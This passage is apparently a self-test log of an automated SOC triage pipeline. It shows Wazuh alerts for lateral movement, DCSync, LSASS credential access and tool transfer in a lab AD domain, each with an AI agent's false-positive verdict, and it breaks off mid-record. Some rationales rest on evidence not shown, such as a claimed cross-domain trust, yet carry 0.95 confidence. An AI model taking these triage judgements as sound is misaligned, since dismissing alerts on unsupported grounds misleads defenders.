@@ -1,0 +1,989 @@
+=== selftest 2026-07-22 03:48Z ===
+# 批量自测  范围=全类  取样=recent  待研判 10 条  模式=recipe  写回图=否(自测不落库)  (IP 已打码)
+
+待研判清单:
+  T1021.001          该类共  44885  uid=5a25c88f582cc24c3908f2614e0941ac88e6ec199f02c0d823804a2ad387a977
+  T1105              该类共  39272  uid=21b4ecf91cdebb82c3ea628364c50b26148c0683025ace31d954bba9c836a05a
+  T1003.006          该类共  12385  uid=34a8f330e6773bddadd863ffb45a2c5822e5ac4e690c3498ddb06b5d25fc2a4d
+  T1003.001          该类共   2355  uid=be49cf933a069c5cb9df3c8e29e096c0490fe9c914c55df962e9b199ef0d8aa7
+  T1140              该类共    195  uid=a0da2b4b7fa09f1a66819ac0dde2ce39b51139516ce7913b4a5dadf38d6116bb
+  T1059.001          该类共    183  uid=bb05ad88f71ffb5e3e367269e938d3b2ccb87b4849cd74c09f1b23a284326b06
+  T1558.003          该类共    171  uid=349c82f781a751ab4470666fd9fbc620dc1583c43b19601d0ea9f853555be062
+  T1059              该类共    126  uid=cc254e6282018ffddb70227acf12e4bd27f8a4c4e295306e95cbe2fbefaebf19
+  (none)             该类共    100  uid=05313449906b1f6710b349c71b6e624ba8117961f8f3de164e7f701aca1d2f8d
+  T1098              该类共     22  uid=2abe65b1d54dbc8522fc450a08c1aca87fd880bfbe1b94022676bb9afe6dfa12
+
+============================================================================
+## [1/10] technique=T1021.001   该类共 44885 条   uid=5a25c88f582cc24c3908f2614e0941ac88e6ec199f02c0d823804a2ad387a977
+============================================================================
+### ① 原始告警节点(:Alert)
+{
+  "severity": 8,
+  "first_seen": "2026-07-22T03:39:48.739240200Z",
+  "last_seen": "2026-07-22T03:39:48.739240200Z",
+  "raw": "{\"@timestamp\": \"2026-07-22T03:39:56.114Z\", \"manager\": {\"name\": \"e5bb7343f06d\"}, \"input\": {\"type\": \"log\"}, \"log_source\": \"wazuh\", \"timestamp\": \"2026-07-22T03:39:49.718+0000\", \"agent\": {\"type\": \"filebeat\", \"version\": \"7.17.22\", \"hostname\": \"f8e24743dcc1\", \"ephemeral_id\": \"d5d271ec-e831-42dd-9d03-45d8ccd7a05b\", \"id\": \"001\", \"name\": \"castelblack\", \"ip\": \"x.x.x.22\"}, \"log\": {\"offset\": 33789059, \"file\": {\"path\": \"/logs/wazuh/alerts.json\"}}, \"host\": {\"name\": \"f8e24743dcc1\"}, \"rule\": {\"id\": \"100805\", \"mitre\": {\"tactic\": [\"Lateral Movement\"], \"technique\": [\"Remote Desktop Protocol\"], \"id\": [\"T1021.001\"]}, \"firedtimes\": 158, \"mail\": false, \"groups\": [\"local\", \"soc\", \"windows\"], \"level\": 8, \"description\": \"Remote/network logon type 3 by robb.stark on castelblack.north.sevenkingdoms.local\"}, \"log_type\": \"hids_alert\", \"ecs\": {\"version\": \"1.12.0\"}, \"id\": \"1784691589.60979014\", \"decoder\": {\"name\": \"windows_eventchannel\"}, \"data\": {\"win\": {\"system\": {\"level\": \"0\", \"threadID\": \"5032\", \"computer\": \"castelblack.north.sevenkingdoms.local\", \"opcode\": \"0\", \"keywords\": \"0x8020000000000000\", \"processID\": \"616\", \"task\": \"12544\", \"systemTime\": \"2026-07-22T03:39:48.739240200Z\", \"providerName\": \"Microsoft-Windows-Security-Auditing\", \"version\": \"2\", \"eventRecordID\": \"311890\", \"providerGuid\": \"{54849625-5478-4994-a5ba-3e3b0328c30d}\", \"eventID\": \"4624\", \"channel\": \"Security\", \"message\": \"\\\"An account was successfully logged on.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nLogon Information:\\r\\n\\tLogon Type:\\t\\t3\\r\\n\\tRestricted Admin Mode:\\t-\\r\\n\\tVirtual Account:\\t\\tNo\\r\\n\\tElevated Token:\\t\\tNo\\r\\n\\r\\nImpersonation Level:\\t\\tImpersonation\\r\\n\\r\\nNew Logon:\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-1229275207-304159137-1120826147-1113\\r\\n\\tAccount Name:\\t\\trobb.stark\\r\\n\\tAccount Domain:\\t\\tNORTH.SEVENKINGDOMS.LOCAL\\r\\n\\tLogon ID:\\t\\t0x34B8A64F\\r\\n\\tLinked Logon ID:\\t\\t0x0\\r\\n\\tNetwork Account Name:\\t-\\r\\n\\tNetwork Account Domain:\\t-\\r\\n\\tLogon GUID:\\t\\t{22210fb5-f80c-bcba-44a9-a8f3faaa7f52}\\r\\n\\r\\nProcess Information:\\r\\n\\tProcess ID:\\t\\t0x0\\r\\n\\tProcess Name:\\t\\t-\\r\\n\\r\\nNetwork Information:\\r\\n\\tWorkstation Name:\\t-\\r\\n\\tSource Network Address:\\t-\\r\\n\\tSource Port:\\t\\t-\\r\\n\\r\\nDetailed Authentication Information:\\r\\n\\tLogon Process:\\t\\tKerberos\\r\\n\\tAuthentication Package:\\tKerberos\\r\\n\\tTransited Services:\\t-\\r\\n\\tPackage Name (NTLM only):\\t-\\r\\n\\tKey Length:\\t\\t0\\r\\n\\r\\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\\r\\n\\r\\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\\r\\n\\r\\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\\r\\n\\r\\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\\r\\n\\r\\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\\r\\n\\r\\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\\r\\n\\r\\nThe authentication information fields provide detailed information about this specific logon request.\\r\\n\\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\\r\\n\\t- Transited services indicate which intermediate services have participated in this logon request.\\r\\n\\t- Package name indicates which sub-protocol was used among the NTLM protocols.\\r\\n\\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\\\"\", \"severityValue\": \"AUDIT_SUCCESS\"}, \"eventdata\": {\"authenticationPackageName\": \"Kerberos\", \"targetUserName\": \"robb.stark\", \"virtualAccount\": \"%%1843\", \"targetUserSid\": \"S-1-5-21-1229275207-304159137-1120826147-1113\", \"keyLength\": \"0\", \"targetLogonId\": \"0x34b8a64f\", \"logonGuid\": \"{22210fb5-f80c-bcba-44a9-a8f3faaa7f52}\", \"subjectUserSid\": \"S-1-0-0\", \"logonType\": \"3\", \"targetDomainName\": \"NORTH.SEVENKINGDOMS.LOCAL\", \"impersonationLevel\": \"%%1833\", \"targetLinkedLogonId\": \"0x0\", \"logonProcessName\": \"Kerberos\", \"subjectLogonId\": \"0x0\", \"processId\": \"0x0\", \"elevatedToken\": \"%%1843\"}}}, \"location\": \"EventChannel\"}",
+  "arrival_ms": 1784691596114,
+  "technique_ids": [
+    "T1021.001"
+  ],
+  "source": "wazuh",
+  "rule_id": "100805",
+  "stream": "soc-hids-alert-*",
+  "alert_uid": "5a25c88f582cc24c3908f2614e0941ac88e6ec199f02c0d823804a2ad387a977",
+  "rule_description": "Remote/network logon type 3 by robb.stark on castelblack.north.sevenkingdoms.local",
+  "sensor": "wazuh-hids",
+  "raw_ref": "soc-hids-alert-2026.07.22:60boh58B3gPM8FAen18_",
+  "time": "2026-07-22T03:39:49.718+0000"
+}
+
+### ② 触发上下文(seed:触发事件 / 主语 / 宾语 / 次要实体)
+Received notification from DBMS server: <GqlStatusObject gql_status='01N52', status_description='warn: property key does not exist. The property `count` does not exist. Verify that the spelling is correct.', position=<SummaryInputPosition line=1, column=84, offset=83>, raw_classification='UNRECOGNIZED', classification=<NotificationClassification.UNRECOGNIZED: 'UNRECOGNIZED'>, raw_severity='WARNING', severity=<NotificationSeverity.WARNING: 'WARNING'>, diagnostic_record={'_classification': 'UNRECOGNIZED', '_severity': 'WARNING', '_position': {'offset': 83, 'line': 1, 'column': 84}, 'OPERATION': '', 'OPERATION_CODE': '0', 'CURRENT_SCHEMA': '/'}> for query: 'MATCH (acc:Account {sam:$s})-[r:AUTHENTICATED_TO]->(h:Host {hostname:$h}) RETURN r.count AS count, r.first_seen AS first_seen, r.last_seen AS last_seen'
+{
+  "event": {
+    "ingest_time": 1784691607964,
+    "arrival_ms": 1784691590485,
+    "source": "winlogbeat",
+    "logon_type": "3",
+    "event_uid": "fb9994b38d5d63cf446ffbf14471805891a7d90c80bdeaf70ed5bc540c7f43ea",
+    "auth_package": "Kerberos",
+    "elevated_token": "%%1843",
+    "stream": "winlogbeat-*",
+    "event_code": "4624",
+    "sensor": "Security",
+    "raw_ref": "soc-hids-alert-2026.07.22:60boh58B3gPM8FAen18_",
+    "event_time": "2026-07-22T03:39:48.739240200Z",
+    "outcome": "success"
+  },
+  "subject": {
+    "_labels": [
+      "Account"
+    ],
+    "privileged": false,
+    "upn": "robb.stark@NORTH.SEVENKINGDOMS.LOCAL",
+    "first_seen": "2026-07-02T02:32:40.375Z",
+    "last_seen": "2026-07-22T03:39:49.292Z",
+    "domain": "NORTH",
+    "type": "user",
+    "sam": "robb.stark",
+    "sid": "S-1-5-21-1229275207-304159137-1120826147-1113"
+  },
+  "related": [
+    {
+      "node": {
+        "_labels": [
+          "Host"
+        ],
+        "hostname": "castelblack.north.sevenkingdoms.local",
+        "role": "member_server",
+        "first_seen": "2026-07-02T02:32:06.696Z",
+        "has_adcs": false,
+        "last_seen": "2026-07-22T03:39:48.753Z",
+        "domain": "north.sevenkingdoms.local",
+        "criticality": "medium",
+        "is_dc": false
+      },
+      "rel": "AUTHENTICATED_TO"
+    },
+    {
+      "node": {
+        "_labels": [
+          "Host"
+        ],
+        "hostname": "castelblack.north.sevenkingdoms.local",
+        "role": "member_server",
+        "first_seen": "2026-07-02T02:32:06.696Z",
+        "has_adcs": false,
+        "last_seen": "2026-07-22T03:39:48.753Z",
+        "domain": "north.sevenkingdoms.local",
+        "criticality": "medium",
+        "is_dc": false
+      },
+      "rel": "ON_HOST"
+    },
+    {
+      "node": {
+        "_labels": [
+          "LogonSession"
+        ],
+        "logon_guid": "{22210fb5-f80c-bcba-44a9-a8f3faaa7f52}",
+        "logon_id": "0x34b8a63c",
+        "first_seen": "2026-07-22T03:39:48.731Z",
+        "last_seen": "2026-07-22T03:39:48.753Z",
+        "logon_type": "3"
+      },
+      "rel": "PRODUCED"
+    }
+  ]
+}
+
+### ③ 研判   [skill] lateral_movement   [模式] recipe
+# 研判留痕(4 步)
+[1] recipe取证「登录事件」→ 1 行
+[2] recipe取证「该账号↔该主机基线」→ 1 行
+[3] recipe取证「账号扇出(共登过几台主机)」→ 1 行
+[4] recipe取证「_图盲区」→ 1 行
+
+# 研判结果  alert=5a25c88f582cc24c3908f2614e0941ac88e6ec199f02c0d823804a2ad387a977  path=B  skill=lateral_movement
+verdict   : false_positive  (confidence=0.95)
+summary   : 判定为误报。证据显示账号 robb.stark 使用 Kerberos 认证 (Logon Type 3) 登录目标主机，且 Key Length 为 0。结合证据中的跨域信任关系，这是跨域信任场景下正常的 Kerberos 认证行为，非横向移动攻击。
+rationale : 1. 认证方式分析：事件 4624 显示 Logon Type 3 (网络登录)，但 Authentication Package 为 Kerberos，且 Key Length 为 0。这通常表示跨域信任 (Cross-Domain Trust) 下的票据传递，而非本地 NTLM 哈希传递 (PtH)。PtH 攻击通常伴随 NTLM 认证包和 Key Length > 0。2. 跨域信任证据：证据中明确存在 '跨域信任' 关系，且目标主机角色为 member_server，符合跨域访问特征。3. 账号属性：账号 robb.stark 非特权账号 (acc_privileged: false)，降低了攻击价值。4. 结论：在存在域信任的前提下，Kerberos 网络登录是正常业务或运维行为，不符合 PtH 攻击特征。
+evidence  : ['event_code: 4624', 'logon_type: 3', 'authentication_package: Kerberos', 'key_length: 0', 'acc_privileged: false', 'target_role: member_server', '跨域信任']
+agent     : qwen3.5-9b
+处置(建议): 无
+
+============================================================================
+## [2/10] technique=T1105   该类共 39272 条   uid=21b4ecf91cdebb82c3ea628364c50b26148c0683025ace31d954bba9c836a05a
+============================================================================
+### ① 原始告警节点(:Alert)
+{
+  "severity": 15,
+  "first_seen": "2026-07-22T03:39:48.491850400Z",
+  "last_seen": "2026-07-22T03:39:48.491850400Z",
+  "raw": "{\"@timestamp\": \"2026-07-22T03:39:56.111Z\", \"decoder\": {\"name\": \"windows_eventchannel\"}, \"data\": {\"win\": {\"system\": {\"level\": \"4\", \"processID\": \"144\", \"providerGuid\": \"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\", \"systemTime\": \"2026-07-22T03:39:48.491850400Z\", \"threadID\": \"2584\", \"message\": \"\\\"File created:\\r\\nRuleName: -\\r\\nUtcTime: 2026-07-22 03:39:48.490\\r\\nProcessGuid: {0d573dc4-3b84-6a60-76bb-040000000e00}\\r\\nProcessId: 5040\\r\\nImage: C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\r\\nTargetFilename: C:\\\\Users\\\\robb.stark\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_op2mb5dq.qfo.ps1\\r\\nCreationUtcTime: 2026-07-22 03:39:48.490\\r\\nUser: NORTH\\\\robb.stark\\\"\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"providerName\": \"Microsoft-Windows-Sysmon\", \"version\": \"2\", \"computer\": \"winterfell.north.sevenkingdoms.local\", \"keywords\": \"0x8000000000000000\", \"opcode\": \"0\", \"severityValue\": \"INFORMATION\", \"eventID\": \"11\", \"task\": \"11\", \"eventRecordID\": \"1394457\"}, \"eventdata\": {\"image\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe\", \"targetFilename\": \"C:\\\\\\\\Users\\\\\\\\robb.stark\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\__PSScriptPolicyTest_op2mb5dq.qfo.ps1\", \"creationUtcTime\": \"2026-07-22 03:39:48.490\", \"user\": \"NORTH\\\\\\\\robb.stark\", \"utcTime\": \"2026-07-22 03:39:48.490\", \"processGuid\": \"{0d573dc4-3b84-6a60-76bb-040000000e00}\", \"processId\": \"5040\"}}}, \"rule\": {\"level\": 15, \"description\": \"Executable file dropped in folder commonly used by malware\", \"id\": \"92213\", \"mitre\": {\"technique\": [\"Ingress Tool Transfer\"], \"id\": [\"T1105\"], \"tactic\": [\"Command and Control\"]}, \"firedtimes\": 68, \"mail\": true, \"groups\": [\"sysmon\", \"sysmon_eid11_detections\", \"windows\"]}, \"manager\": {\"name\": \"e5bb7343f06d\"}, \"log\": {\"file\": {\"path\": \"/logs/wazuh/alerts.json\"}, \"offset\": 33739047}, \"log_type\": \"hids_alert\", \"ecs\": {\"version\": \"1.12.0\"}, \"host\": {\"name\": \"f8e24743dcc1\"}, \"agent\": {\"id\": \"005\", \"name\": \"winterfell\", \"hostname\": \"f8e24743dcc1\", \"ephemeral_id\": \"d5d271ec-e831-42dd-9d03-45d8ccd7a05b\", \"type\": \"filebeat\", \"version\": \"7.17.22\", \"ip\": \"x.x.x.11\"}, \"timestamp\": \"2026-07-22T03:39:49.250+0000\", \"id\": \"1784691589.60886346\", \"location\": \"EventChannel\", \"input\": {\"type\": \"log\"}, \"log_source\": \"wazuh\"}",
+  "arrival_ms": 1784691596111,
+  "technique_ids": [
+    "T1105"
+  ],
+  "source": "wazuh",
+  "rule_id": "92213",
+  "stream": "soc-hids-alert-*",
+  "alert_uid": "21b4ecf91cdebb82c3ea628364c50b26148c0683025ace31d954bba9c836a05a",
+  "rule_description": "Executable file dropped in folder commonly used by malware",
+  "sensor": "wazuh-hids",
+  "raw_ref": "soc-hids-alert-2026.07.22:4kboh58B3gPM8FAen18_",
+  "time": "2026-07-22T03:39:49.250+0000"
+}
+
+### ② 触发上下文(seed:触发事件 / 主语 / 宾语 / 次要实体)
+{
+  "event": {
+    "creation_time": "2026-07-22 03:39:48.490",
+    "ingest_time": 1784691607816,
+    "stream": "winlogbeat-*",
+    "event_code": "11",
+    "arrival_ms": 1784691589740,
+    "raw_ref": "winlogbeat-7.17.22-2026.07.22:tUboh58B3gPM8FAehl9T",
+    "sensor": "Microsoft-Windows-Sysmon/Operational",
+    "source": "winlogbeat",
+    "event_time": "2026-07-22T03:39:48.491Z",
+    "event_uid": "2fee6c6e61992fbf5cec51b12c4ec0a94a6d65b104cbad23854db6d30f06d1a6"
+  },
+  "subject": {
+    "_labels": [
+      "Process"
+    ],
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "first_seen": "2026-07-22T03:39:48.413Z",
+    "process_guid": "{0d573dc4-3b84-6a60-76bb-040000000e00}",
+    "last_seen": "2026-07-22T03:39:49.292Z",
+    "hashes": "MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
+    "pid": "5040",
+    "command_line": "powershell  c:\\setup\\bot_rdp.ps1"
+  },
+  "related": [
+    {
+      "node": {
+        "_labels": [
+          "File"
+        ],
+        "path": "C:\\\\Users\\\\robb.stark\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_op2mb5dq.qfo.ps1",
+        "first_seen": "2026-07-22T03:39:48.491850400Z",
+        "last_seen": "2026-07-22T03:39:48.491850400Z",
+        "host": "winterfell.north.sevenkingdoms.local"
+      },
+      "rel": "WROTE"
+    },
+    {
+      "node": {
+        "_labels": [
+          "Host"
+        ],
+        "hostname": "winterfell.north.sevenkingdoms.local",
+        "role": "domain_controller",
+        "first_seen": "2026-07-02T02:32:07.265Z",
+        "has_adcs": false,
+        "last_seen": "2026-07-22T03:40:03.222383500Z",
+        "domain": "north.sevenkingdoms.local",
+        "criticality": "critical",
+        "is_dc": true
+      },
+      "rel": "ON_HOST"
+    },
+    {
+      "node": {
+        "_labels": [
+          "File"
+        ],
+        "path": "C:\\Users\\robb.stark\\AppData\\Local\\Temp\\__PSScriptPolicyTest_op2mb5dq.qfo.ps1",
+        "first_seen": "2026-07-22T03:39:48.491Z",
+        "last_seen": "2026-07-22T03:39:48.491Z",
+        "host": "winterfell.north.sevenkingdoms.local"
+      },
+      "rel": "WROTE"
+    }
+  ]
+}
+
+### ③ 研判   [skill] ingress_tool_transfer   [模式] recipe
+# 研判留痕(9 步)
+[1] recipe取证「事件类型」→ 1 行
+[2] recipe取证「触发进程」→ 1 行
+[3] recipe取证「落地文件」→ 2 行
+[4] recipe取证「主机」→ 1 行
+[5] recipe取证「供给/自检噪声」→ 1 行
+[6] recipe取证「父进程」→ 1 行
+[7] recipe取证「外连目的(仅存在性,信誉是盲区)」→ 1 行
+[8] recipe取证「落地即执行(SPAWNED 子进程)」→ 1 行
+[9] recipe取证「_图盲区」→ 1 行
+
+# 研判结果  alert=21b4ecf91cdebb82c3ea628364c50b26148c0683025ace31d954bba9c836a05a  path=B  skill=ingress_tool_transfer
+verdict   : false_positive  (confidence=0.95)
+summary   : PowerShell 执行策略自检探针(PSExecutionPolicyTestFile)，属系统良性行为。
+rationale : 证据明确标记为'ps_execution_policy_probe'，文件名特征'__PSScriptPolicyTest_...'符合 Windows 系统自动生成的执行策略测试文件模式。虽然触发进程为 PowerShell 且落入了 Temp 目录，但这是系统自检机制，非攻击载荷投递。
+evidence  : ['alert_uid: 21b4ecf91cdebb82c3ea628364c50b26148c0683025ace31d954bba9c836a05a', 'supply_noise_tag: ps_execution_policy_probe', 'filename_pattern: __PSScriptPolicyTest_op2mb5dq.qfo.ps1']
+agent     : qwen3.5-9b
+处置(建议): 无
+
+============================================================================
+## [3/10] technique=T1003.006   该类共 12385 条   uid=34a8f330e6773bddadd863ffb45a2c5822e5ac4e690c3498ddb06b5d25fc2a4d
+============================================================================
+### ① 原始告警节点(:Alert)
+{
+  "severity": 8,
+  "first_seen": "2026-07-22T03:40:03.222383500Z",
+  "last_seen": "2026-07-22T03:40:03.222383500Z",
+  "raw": "{\"@timestamp\": \"2026-07-22T03:40:07.121Z\", \"rule\": {\"mitre\": {\"tactic\": [\"Credential Access\"], \"technique\": [\"DCSync\"], \"id\": [\"T1003.006\"]}, \"firedtimes\": 46, \"mail\": false, \"groups\": [\"local\", \"soc\", \"windows\"], \"level\": 8, \"description\": \"Possible DCSync: directory replication rights access by KINGSLANDING$\", \"id\": \"100807\"}, \"data\": {\"win\": {\"system\": {\"providerGuid\": \"{54849625-5478-4994-a5ba-3e3b0328c30d}\", \"eventRecordID\": \"796742\", \"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4662\", \"processID\": \"600\", \"severityValue\": \"AUDIT_SUCCESS\", \"level\": \"0\", \"version\": \"0\", \"task\": \"14080\", \"message\": \"\\\"An operation was performed on an object.\\r\\n\\r\\nSubject :\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-3669086071-63869131-912362612-1001\\r\\n\\tAccount Name:\\t\\tKINGSLANDING$\\r\\n\\tAccount Domain:\\t\\tSEVENKINGDOMS\\r\\n\\tLogon ID:\\t\\t0x44B59797\\r\\n\\r\\nObject:\\r\\n\\tObject Server:\\t\\tDS\\r\\n\\tObject Type:\\t\\t%{19195a5b-6da0-11d0-afd3-00c04fd930c9}\\r\\n\\tObject Name:\\t\\t%{861130f0-df4a-4937-a198-e526766d973b}\\r\\n\\tHandle ID:\\t\\t0x0\\r\\n\\r\\nOperation:\\r\\n\\tOperation Type:\\t\\tObject Access\\r\\n\\tAccesses:\\t\\tControl Access\\r\\n\\t\\t\\t\\t\\r\\n\\tAccess Mask:\\t\\t0x100\\r\\n\\tProperties:\\t\\tControl Access\\r\\n\\t\\t{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}\\r\\n\\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\\r\\n\\r\\n\\r\\nAdditional Information:\\r\\n\\tParameter 1:\\t\\t-\\r\\n\\tParameter 2:\\t\\t\\\"\", \"opcode\": \"0\", \"systemTime\": \"2026-07-22T03:40:03.222383500Z\", \"threadID\": \"724\", \"computer\": \"winterfell.north.sevenkingdoms.local\", \"keywords\": \"0x8020000000000000\", \"channel\": \"Security\"}, \"eventdata\": {\"properties\": \"%%7688    {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}   {19195a5b-6da0-11d0-afd3-00c04fd930c9}\", \"subjectDomainName\": \"SEVENKINGDOMS\", \"operationType\": \"Object Access\", \"handleId\": \"0x0\", \"accessList\": \"%%7688\", \"subjectLogonId\": \"0x44b59797\", \"objectServer\": \"DS\", \"objectName\": \"%{861130f0-df4a-4937-a198-e526766d973b}\", \"subjectUserSid\": \"S-1-5-21-3669086071-63869131-912362612-1001\", \"objectType\": \"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}\", \"subjectUserName\": \"KINGSLANDING$\", \"accessMask\": \"0x100\"}}}, \"timestamp\": \"2026-07-22T03:40:04.247+0000\", \"log_source\": \"wazuh\", \"id\": \"1784691604.61022350\", \"log_type\": \"hids_alert\", \"agent\": {\"id\": \"005\", \"name\": \"winterfell\", \"ip\": \"x.x.x.11\", \"hostname\": \"f8e24743dcc1\", \"ephemeral_id\": \"d5d271ec-e831-42dd-9d03-45d8ccd7a05b\", \"type\": \"filebeat\", \"version\": \"7.17.22\"}, \"manager\": {\"name\": \"e5bb7343f06d\"}, \"ecs\": {\"version\": \"1.12.0\"}, \"host\": {\"name\": \"f8e24743dcc1\"}, \"log\": {\"offset\": 33814219, \"file\": {\"path\": \"/logs/wazuh/alerts.json\"}}, \"decoder\": {\"name\": \"windows_eventchannel\"}, \"location\": \"EventChannel\", \"input\": {\"type\": \"log\"}}",
+  "arrival_ms": 1784691607121,
+  "technique_ids": [
+    "T1003.006"
+  ],
+  "source": "wazuh",
+  "rule_id": "100807",
+  "stream": "soc-hids-alert-*",
+  "alert_uid": "34a8f330e6773bddadd863ffb45a2c5822e5ac4e690c3498ddb06b5d25fc2a4d",
+  "rule_description": "Possible DCSync: directory replication rights access by KINGSLANDING$",
+  "sensor": "wazuh-hids",
+  "raw_ref": "soc-hids-alert-2026.07.22:FUboh58B3gPM8FAeymA7",
+  "time": "2026-07-22T03:40:04.247+0000"
+}
+
+### ② 触发上下文(seed:触发事件 / 主语 / 宾语 / 次要实体)
+{
+  "event": {
+    "ingest_time": 1784691609950,
+    "access_mask": "0x100",
+    "event_code": "4662",
+    "sensor": "Security",
+    "raw_ref": "soc-hids-alert-2026.07.22:FUboh58B3gPM8FAeymA7",
+    "source": "winlogbeat",
+    "operation": "Object Access",
+    "properties": "%%7688    {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}   {19195a5b-6da0-11d0-afd3-00c04fd930c9}",
+    "event_time": "2026-07-22T03:40:03.222383500Z",
+    "event_uid": "bc29ca0f21f9431b85cbe39493e59384ed9f2361695c75b6a3b735c2d5e9fb39"
+  },
+  "subject": {
+    "_labels": [
+      "Account"
+    ],
+    "upn": "KINGSLANDING$@SEVENKINGDOMS.LOCAL",
+    "first_seen": "2026-06-26T10:05:29.972Z",
+    "last_seen": "2026-07-22T03:40:03.222383500Z",
+    "domain": "SEVENKINGDOMS",
+    "sam": "kingslanding$",
+    "sid": "S-1-5-18"
+  },
+  "related": [
+    {
+      "node": {
+        "_labels": [
+          "DirectoryObject"
+        ],
+        "first_seen": "2026-06-26T10:43:17.525Z",
+        "last_seen": "2026-07-22T03:40:03.222383500Z",
+        "guid": "%{861130f0-df4a-4937-a198-e526766d973b}"
+      },
+      "rel": "ACCESSED"
+    },
+    {
+      "node": {
+        "_labels": [
+          "Host"
+        ],
+        "hostname": "winterfell.north.sevenkingdoms.local",
+        "role": "domain_controller",
+        "first_seen": "2026-07-02T02:32:07.265Z",
+        "has_adcs": false,
+        "last_seen": "2026-07-22T03:40:03.222383500Z",
+        "domain": "north.sevenkingdoms.local",
+        "criticality": "critical",
+        "is_dc": true
+      },
+      "rel": "ON_HOST"
+    }
+  ]
+}
+
+### ③ 研判   [skill] dcsync   [模式] recipe
+# 研判留痕(4 步)
+[1] recipe取证「发起者与对象」→ 1 行
+[2] recipe取证「发起者估值」→ 1 行
+[3] recipe取证「域DC」→ 1 行
+[4] recipe取证「_图盲区」→ 1 行
+
+# 研判结果  alert=34a8f330e6773bddadd863ffb45a2c5822e5ac4e690c3498ddb06b5d25fc2a4d  path=B  skill=dcsync
+verdict   : false_positive  (confidence=0.95)
+summary   : DC 正常复制行为。发起者 KINGSLANDING$ 为本域机器账号，且目标域控主机名为 winterfell，与域 DC 短名一致，属于域内 DC 间正常目录复制。
+rationale : 1. 发起者身份：actor_sam 为 kingslanding$，actor_is_machine 为 true，确认为机器账号。2. 目标域控：event_host_is_dc 为 true，且 dc_host 为 winterfell，与 event_host 主机名一致，确认为本域 DC。3. 行为性质：DC 之间基于 AD 信任机制会持续进行目录复制（GetNCChanges），这是正常运维行为。4. 证据链：发起者为本域 DC 机器账号 + 目标为 DC + 访问掩码包含复制 GUID(1131f6aa)，完全符合误报特征。
+evidence  : ['34a8f330e6773bddadd863ffb45a2c5822e5ac4e690c3498ddb06b5d25fc2a4d', 'kingslanding$', 'winterfell.north.sevenkingdoms.local']
+agent     : qwen3.5-9b
+处置(建议): 无
+
+============================================================================
+## [4/10] technique=T1003.001   该类共 2355 条   uid=be49cf933a069c5cb9df3c8e29e096c0490fe9c914c55df962e9b199ef0d8aa7
+============================================================================
+### ① 原始告警节点(:Alert)
+{
+  "severity": 12,
+  "first_seen": "2026-07-22T03:07:44.306606300Z",
+  "last_seen": "2026-07-22T03:07:44.306606300Z",
+  "raw": "{\"@timestamp\": \"2026-07-22T03:07:52.096Z\", \"log_type\": \"hids_alert\", \"timestamp\": \"2026-07-22T03:07:45.283+0000\", \"rule\": {\"mitre\": {\"id\": [\"T1003.001\"], \"tactic\": [\"Credential Access\"], \"technique\": [\"LSASS Memory\"]}, \"firedtimes\": 1, \"mail\": true, \"groups\": [\"local\", \"soc\", \"windows\"], \"level\": 12, \"description\": \"Credential dumping via LSASS access by C:\\\\\\\\Program Files (x86)\\\\\\\\ossec-agent\\\\\\\\wazuh-agent.exe (granted 0x1410)\", \"id\": \"100802\"}, \"decoder\": {\"name\": \"windows_eventchannel\"}, \"log\": {\"offset\": 28866383, \"file\": {\"path\": \"/logs/wazuh/alerts.json\"}}, \"log_source\": \"wazuh\", \"input\": {\"type\": \"log\"}, \"ecs\": {\"version\": \"1.12.0\"}, \"agent\": {\"ephemeral_id\": \"d5d271ec-e831-42dd-9d03-45d8ccd7a05b\", \"id\": \"001\", \"name\": \"castelblack\", \"ip\": \"x.x.x.22\", \"type\": \"filebeat\", \"version\": \"7.17.22\", \"hostname\": \"f8e24743dcc1\"}, \"location\": \"EventChannel\", \"manager\": {\"name\": \"e5bb7343f06d\"}, \"id\": \"1784689665.52106179\", \"data\": {\"win\": {\"eventdata\": {\"sourceUser\": \"NT AUTHORITY\\\\\\\\SYSTEM\", \"targetImage\": \"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\lsass.exe\", \"ruleName\": \"LSASS_access\", \"sourceImage\": \"C:\\\\\\\\Program Files (x86)\\\\\\\\ossec-agent\\\\\\\\wazuh-agent.exe\", \"sourceThreadId\": \"3432\", \"sourceProcessId\": \"3132\", \"grantedAccess\": \"0x1410\", \"targetUser\": \"NT AUTHORITY\\\\\\\\SYSTEM\", \"targetProcessGUID\": \"{85e8c649-8397-6a43-0c00-000000001400}\", \"callTrace\": 